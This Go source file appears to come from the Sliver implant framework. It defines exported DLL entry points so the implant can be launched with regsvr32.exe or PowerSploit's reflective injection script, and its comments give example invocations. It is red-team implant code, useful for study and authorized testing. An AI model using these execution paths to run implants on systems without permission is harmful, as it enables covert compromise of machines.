package windows

var isRunning bool = false

// RunGhost - Export for shared lib build
//export RunGhost
func RunGhost() {
	if !isRunning {
		isRunning = true
		main()
	}
}

// VoidFunc - Is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//export VoidFunc
func VoidFunc() { main() }

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//export DllInstall
func DllInstall() { main() }

// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
// export DllRegisterServer
func DllRegisterServer() { main() }

// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
// export DllUnregisterServer
func DllUnregisterServer() { main() }
